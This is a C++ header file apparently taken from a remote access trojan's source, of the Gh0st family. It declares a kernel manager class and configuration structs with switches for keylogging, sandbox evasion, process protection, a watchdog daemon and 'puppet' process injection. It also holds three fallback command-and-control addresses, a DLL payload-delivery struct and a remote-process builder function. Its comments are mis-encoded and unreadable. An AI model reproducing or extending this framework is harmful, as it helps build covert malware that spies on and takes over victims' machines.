#pragma once
#include "stdafx.h"
#include "Manager.h"


class CKernelManager;
enum  KernelManager
{
	COMMAND_ACTIVED,
};

struct Function
{
	BOOL IsKeyboard;		//�������߼�¼
	BOOL IsAntiSimulation;	//��ɳ��
	BOOL ProtectedProcess;	//���̱���
	BOOL antinet;			//��������
	BOOL RunDllEntryProc;	//�Ƿ�����DLL���

	BOOL  Processdaemon;	//�����ػ�
	BOOL  puppet;			//���ܽ���
	BOOL  special;
	BOOL  bool4;	//����
	BOOL  bool5;	//����



	TCHAR other1[255];  //����
	TCHAR other2[255];  //����
	TCHAR other3[255];  //����
	TCHAR other4[255];	//����
	TCHAR other5[255];  //����
};


struct Info
{
	char mark[30];		//���
	TCHAR szAddress[255];  //ip
	TCHAR szPort[30];		//�˿�
	BOOL IsTcp;			//ͨ��ģʽ
	TCHAR szAddress2[255];  //ip
	TCHAR szPort2[30];		//�˿�
	BOOL IsTcp2;			//ͨ��ģʽ
	TCHAR szAddress3[255];  //ip
	TCHAR szPort3[30];		//�˿�
	BOOL IsTcp3;			//ͨ��ģʽ
	TCHAR szRunSleep[30];	//���еȴ�����ʼ����ʱ�ȴ�ʱ�� ��ֹ�ֶ��鿴������أ�
	TCHAR szHeart[30];		//����ʱ��
	TCHAR szGroup[50];		//����
	TCHAR szVersion[50];	//�汾
	TCHAR Remark[50];		//��ע
	Function otherset;		//��������
};


enum SENDTASK
{
	TASK_MAIN,					//��ͨ�����ʽ ��1����ͨ���������� ��������
	TASK_DOEVERYTHING,			//  ���ַ��������ͳ��ȣ����������Լ�������
	TASK_ONLY,					//ֻ����DLL����
};


struct DllSendDate
{
	SENDTASK sendtask;
	TCHAR DllName[255];			 //DL����
	BOOL is_64;					//λ��
	int DateSize;				//DLL��С
	TCHAR szVersion[50];		//�汾
	TCHAR szcommand[1000];
	int i;
};




class CKernelManager : public CManager
{
public:
	virtual ~CKernelManager();
	CKernelManager(ISocketBase* pClient,BOOL bpuppet);
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	VOID runbin();
	BOOL m_bpuppet;
	HANDLE	hWorker;

};


BOOL buildremoteprocess(byte* data, int size, PROCESS_INFORMATION* pi);
bool pid_is_running(DWORD pid);
int memfind(const char* mem, const char* str, int sizem, int sizes);


